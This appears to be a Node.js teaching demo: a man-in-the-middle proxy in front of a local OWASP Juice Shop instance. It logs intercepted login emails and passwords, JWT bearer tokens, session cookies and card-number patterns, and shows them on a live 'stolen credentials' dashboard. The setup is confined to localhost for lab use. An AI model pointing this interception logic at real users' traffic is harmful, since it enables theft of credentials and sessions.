/* eslint-disable */
// ═══════════════════════════════════════════════════
//  RootX MITM Proxy — mitm-proxy.js
//  
//  HOW TO RUN:
//  1. cd D:\RootX\frontend
//  2. npm install http-proxy
//  3. node mitm-proxy.js
//
//  HOW TO USE:
//  - Open browser → go to http://localhost:8080
//  - This proxies ALL traffic through to Juice Shop
//  - Every request/response is intercepted and logged
//  - Dashboard at http://localhost:8081 shows live feed
// ═══════════════════════════════════════════════════

const http       = require("http");
const httpProxy  = require("http-proxy");
const url        = require("url");

const TARGET      = "http://127.0.0.1:3001"; // Juice Shop
const PROXY_PORT  = 8080;                     // MITM proxy port
const DASH_PORT   = 8081;                     // Live log dashboard port

/* ── Intercepted traffic log ── */
const intercepted = [];
let requestCount  = 0;
let credentialsStolenCount = 0;
const stolenData  = [];

/* ── Colors for terminal ── */
const C = {
  red:    "\x1b[31m",
  green:  "\x1b[32m",
  yellow: "\x1b[33m",
  cyan:   "\x1b[36m",
  white:  "\x1b[37m",
  bold:   "\x1b[1m",
  reset:  "\x1b[0m",
};

function log(level, msg) {
  const time = new Date().toLocaleTimeString();
  const prefix = {
    INFO:  `${C.cyan}[INFO]${C.reset}`,
    WARN:  `${C.yellow}[WARN]${C.reset}`,
    CRIT:  `${C.red}${C.bold}[CRITICAL]${C.reset}`,
    SAFE:  `${C.green}[INTERCEPTED]${C.reset}`,
  }[level] || "[LOG]";
  console.log(`${C.white}${time}${C.reset} ${prefix} ${msg}`);
}

/* ── Detect sensitive data in request ── */
function analyseSensitiveData(method, path, body, headers) {
  const findings = [];

  // Detect login attempts — capture credentials
  if (path.includes("/rest/user/login") && method === "POST") {
    try {
      const parsed = JSON.parse(body);
      if (parsed.email || parsed.password) {
        findings.push({
          type: "CREDENTIAL_CAPTURE",
          severity: "CRITICAL",
          data: {
            email:    parsed.email    ?? "N/A",
            password: parsed.password ?? "N/A",
          },
          message: `LOGIN INTERCEPTED — Email: ${parsed.email} | Password: ${parsed.password}`,
        });
        credentialsStolenCount++;
        stolenData.push({
          time: new Date().toISOString(),
          type: "Login Credentials",
          email:    parsed.email,
          password: parsed.password,
          endpoint: path,
        });
        log("CRIT", `🔑 CREDENTIALS STOLEN → Email: ${parsed.email} | Password: ${parsed.password}`);
      }
    } catch { /* not JSON */ }
  }

  // Detect auth tokens in headers
  const authHeader = headers["authorization"] ?? "";
  if (authHeader.startsWith("Bearer ")) {
    findings.push({
      type: "TOKEN_INTERCEPTED",
      severity: "CRITICAL",
      data: { token: authHeader.substring(7, 50) + "..." },
      message: "JWT Bearer token intercepted from request headers",
    });
    log("CRIT", `🔐 JWT TOKEN INTERCEPTED: ${authHeader.substring(7, 40)}...`);
  }

  // Detect cookie theft
  const cookie = headers["cookie"] ?? "";
  if (cookie) {
    findings.push({
      type: "COOKIE_INTERCEPTED",
      severity: "HIGH",
      data: { cookie: cookie.substring(0, 80) + (cookie.length > 80 ? "..." : "") },
      message: "Session cookie intercepted",
    });
    log("WARN", `🍪 COOKIE INTERCEPTED: ${cookie.substring(0, 60)}...`);
  }

  // Detect credit card or sensitive patterns
  if (body.match(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/)) {
    findings.push({
      type: "CREDIT_CARD",
      severity: "CRITICAL",
      data: { pattern: "Credit card number pattern detected" },
      message: "Potential credit card data intercepted",
    });
    log("CRIT", "💳 CREDIT CARD PATTERN DETECTED IN REQUEST");
  }

  return findings;
}

/* ── Analyse response for sensitive data ── */
function analyseResponse(path, statusCode, responseBody, responseHeaders) {
  const findings = [];

  // Check for token in login response
  if (path.includes("/rest/user/login") && statusCode === 200) {
    try {
      const parsed = JSON.parse(responseBody);
      if (parsed?.authentication?.token) {
        findings.push({
          type: "SESSION_TOKEN_RESPONSE",
          severity: "CRITICAL",
          data: { token: parsed.authentication.token.substring(0, 50) + "..." },
          message: `Session token captured from login response`,
        });
        log("CRIT", `🎯 SESSION TOKEN FROM RESPONSE: ${parsed.authentication.token.substring(0, 40)}...`);
      }
    } catch { /* not JSON */ }
  }

  // Check insecure cookie in response
  const setCookie = responseHeaders["set-cookie"] ?? "";
  if (setCookie && (!setCookie.includes("HttpOnly") || !setCookie.includes("Secure"))) {
    findings.push({
      type: "INSECURE_COOKIE_SET",
      severity: "HIGH",
      data: { cookie: setCookie.substring(0, 80) },
      message: "Server set insecure cookie (missing HttpOnly/Secure flags)",
    });
    log("WARN", `⚠ INSECURE COOKIE SET BY SERVER: ${setCookie.substring(0, 60)}`);
  }

  return findings;
}

/* ════════════════════════════════════════════
   CREATE PROXY
════════════════════════════════════════════ */
const proxy = httpProxy.createProxyServer({
  target: TARGET,
  selfHandleResponse: true,
});

/* ── Capture response body ── */
proxy.on("proxyRes", (proxyRes, req, res) => {
  let responseBody = "";
  const chunks = [];

  proxyRes.on("data", (chunk) => chunks.push(chunk));
  proxyRes.on("end", () => {
    responseBody = Buffer.concat(chunks).toString("utf8");

    // Analyse response
    const responseFindings = analyseResponse(
      req.url,
      proxyRes.statusCode,
      responseBody,
      proxyRes.headers
    );

    // Update the log entry with response data
    const entry = intercepted.find(e => e.requestId === req._rootxId);
    if (entry) {
      entry.response = {
        statusCode: proxyRes.statusCode,
        headers: proxyRes.headers,
        bodyPreview: responseBody.substring(0, 200),
        findings: responseFindings,
      };
    }

    // Forward response to browser
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    res.end(responseBody);
  });
});

proxy.on("error", (err, req, res) => {
  log("WARN", `Proxy error: ${err.message}`);
  res.writeHead(502, { "Content-Type": "text/plain" });
  res.end(`RootX MITM Proxy Error: ${err.message}\nMake sure Juice Shop is running on port 3001`);
});

/* ── Main proxy server on port 8080 ── */
const proxyServer = http.createServer((req, res) => {
  let body = "";
  req.on("data", chunk => { body += chunk.toString(); });
  req.on("end", () => {
    requestCount++;
    const reqId = `req-${Date.now()}-${requestCount}`;
    req._rootxId = reqId;

    // Analyse request
    const findings = analyseSensitiveData(req.method, req.url, body, req.headers);

    // Log entry
    const entry = {
      requestId: reqId,
      timestamp: new Date().toISOString(),
      method:    req.method,
      path:      req.url,
      headers:   req.headers,
      bodyPreview: body.substring(0, 300),
      findings,
      response:  null,
    };
    intercepted.unshift(entry);
    if (intercepted.length > 200) intercepted.pop();

    // Terminal log
    const hasCrit = findings.some(f => f.severity === "CRITICAL");
    if (hasCrit) {
      log("CRIT", `${req.method} ${req.url}`);
    } else {
      log("INFO", `${req.method} ${req.url}`);
    }

    // Forward to Juice Shop
    proxy.web(req, res, { buffer: require("stream").Readable.from([body]) });
  });
});

proxyServer.listen(PROXY_PORT, "127.0.0.1", () => {
  log("INFO", `MITM Proxy running → http://127.0.0.1:${PROXY_PORT}`);
  log("INFO", `Proxying all traffic to → ${TARGET}`);
});

/* ════════════════════════════════════════════
   LIVE DASHBOARD SERVER on port 8081
   Open this in browser to see live intercepts
════════════════════════════════════════════ */
const dashServer = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  // JSON API for RootX frontend
  if (parsed.pathname === "/api/log") {
    res.writeHead(200, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    });
    return res.end(JSON.stringify({
      active: true,
      target: TARGET,
      requestCount,
      credentialsStolenCount,
      stolenData,
      log: intercepted.slice(0, 50),
    }));
  }

  // HTML dashboard
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(`<!DOCTYPE html>
<html>
<head>
  <title>RootX — MITM Live Intercept</title>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="2">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #060b18; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 24px; }
    h1 { color: #00FF9C; font-size: 1.2rem; letter-spacing: .3em; margin-bottom: 4px; }
    .sub { color: rgba(255,255,255,.3); font-size: .7rem; letter-spacing: .1em; margin-bottom: 24px; }
    .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 12px; margin-bottom: 24px; }
    .stat { background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.07); border-radius: 6px; padding: 14px; text-align: center; }
    .stat-val { font-size: 1.8rem; font-weight: 700; display: block; }
    .stat-lbl { font-size: .6rem; color: rgba(255,255,255,.3); letter-spacing: .1em; margin-top: 4px; display: block; }
    .stolen-box { background: rgba(248,113,113,.08); border: 1px solid rgba(248,113,113,.3); border-radius: 6px; padding: 16px; margin-bottom: 20px; }
    .stolen-title { color: #f87171; font-size: .8rem; letter-spacing: .15em; margin-bottom: 10px; }
    .stolen-item { background: rgba(248,113,113,.05); border: 1px solid rgba(248,113,113,.15); border-radius: 4px; padding: 10px; margin-bottom: 6px; font-size: .72rem; }
    .cred-email { color: #fb923c; } .cred-pass { color: #f87171; font-weight: bold; }
    .log-title { color: #00FF9C; font-size: .75rem; letter-spacing: .15em; margin-bottom: 10px; }
    .entry { border: 1px solid rgba(255,255,255,.06); border-radius: 5px; padding: 10px 14px; margin-bottom: 6px; }
    .entry.crit { border-color: rgba(248,113,113,.3); background: rgba(248,113,113,.05); }
    .entry.high { border-color: rgba(251,146,60,.3); background: rgba(251,146,60,.05); }
    .entry-top { display: flex; gap: 10px; align-items: center; margin-bottom: 4px; }
    .method { font-size: .65rem; padding: 2px 6px; border-radius: 3px; background: rgba(0,255,156,.1); color: #00FF9C; border: 1px solid rgba(0,255,156,.2); }
    .path { font-size: .72rem; color: #e2e8f0; flex: 1; }
    .time { font-size: .6rem; color: rgba(255,255,255,.2); }
    .finding { font-size: .65rem; color: #f87171; margin-top: 4px; padding: 4px 8px; background: rgba(248,113,113,.08); border-radius: 3px; }
    .finding.high { color: #fb923c; background: rgba(251,146,60,.08); }
    .status-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(0,255,156,.08); border-top: 1px solid rgba(0,255,156,.2); padding: 8px 24px; font-size: .65rem; color: rgba(0,255,156,.7); letter-spacing: .1em; }
  </style>
</head>
<body>
  <h1>◈ ROOTX — LIVE MITM INTERCEPT</h1>
  <div class="sub">Auto-refreshes every 2 seconds · Proxying → ${TARGET}</div>

  <div class="stats">
    <div class="stat"><span class="stat-val" style="color:#00FF9C">${requestCount}</span><span class="stat-lbl">REQUESTS INTERCEPTED</span></div>
    <div class="stat"><span class="stat-val" style="color:#f87171">${credentialsStolenCount}</span><span class="stat-lbl">CREDENTIALS STOLEN</span></div>
    <div class="stat"><span class="stat-val" style="color:#fb923c">${intercepted.filter(e => e.findings?.length > 0).length}</span><span class="stat-lbl">SENSITIVE FINDINGS</span></div>
    <div class="stat"><span class="stat-val" style="color:#facc15">${intercepted.filter(e => e.response?.statusCode === 200).length}</span><span class="stat-lbl">SUCCESSFUL REQUESTS</span></div>
  </div>

  ${stolenData.length > 0 ? `
  <div class="stolen-box">
    <div class="stolen-title">☠ STOLEN CREDENTIALS — ATTACKER HAS THIS DATA</div>
    ${stolenData.map(s => `
      <div class="stolen-item">
        <span class="cred-email">Email: ${s.email}</span> &nbsp;|&nbsp;
        <span class="cred-pass">Password: ${s.password}</span> &nbsp;|&nbsp;
        <span style="color:rgba(255,255,255,.3)">${new Date(s.time).toLocaleTimeString()}</span>
      </div>
    `).join("")}
  </div>` : `<div style="color:rgba(255,255,255,.2);font-size:.75rem;margin-bottom:20px">
    No credentials captured yet. Go to http://localhost:8080 and log into Juice Shop to see MITM in action.
  </div>`}

  <div class="log-title">▸ LIVE REQUEST LOG</div>
  ${intercepted.slice(0, 30).map(e => {
    const hasCrit = e.findings?.some(f => f.severity === "CRITICAL");
    const hasHigh = e.findings?.some(f => f.severity === "HIGH");
    const cls = hasCrit ? "crit" : hasHigh ? "high" : "";
    return `
    <div class="entry ${cls}">
      <div class="entry-top">
        <span class="method">${e.method}</span>
        <span class="path">${e.path}</span>
        <span style="color:${e.response?.statusCode === 200 ? "#00FF9C" : e.response?.statusCode >= 400 ? "#f87171" : "#facc15"}">${e.response?.statusCode ?? "..."}</span>
        <span class="time">${new Date(e.timestamp).toLocaleTimeString()}</span>
      </div>
      ${(e.findings ?? []).map(f => `
        <div class="finding ${f.severity === "HIGH" ? "high" : ""}">${f.severity === "CRITICAL" ? "☠" : "⚠"} ${f.message}</div>
      `).join("")}
    </div>`;
  }).join("")}

  <div class="status-bar">● MITM PROXY ACTIVE · http://127.0.0.1:${PROXY_PORT} → ${TARGET} · Page auto-refreshes</div>
</body>
</html>`);
});

dashServer.listen(DASH_PORT, "127.0.0.1", () => {
  console.log(`
${C.green}${C.bold}
╔══════════════════════════════════════════════╗
║         ROOTX MITM PROXY ACTIVE             ║
╠══════════════════════════════════════════════╣
║                                              ║
║  STEP 1 → Open browser:                     ║
║           http://localhost:8080              ║
║           (this IS the MITM intercepted      ║
║            version of Juice Shop)            ║
║                                              ║
║  STEP 2 → Watch live intercepts:             ║
║           http://localhost:8081              ║
║                                              ║
║  STEP 3 → Log into Juice Shop on 8080        ║
║           Watch credentials get stolen LIVE  ║
║                                              ║
╚══════════════════════════════════════════════╝
${C.reset}`);
});

/* ── Graceful shutdown ── */
process.on("SIGINT", () => {
  console.log(`\n${C.yellow}[RootX] MITM Proxy shutting down...${C.reset}`);
  proxyServer.close();
  dashServer.close();
  process.exit(0);
});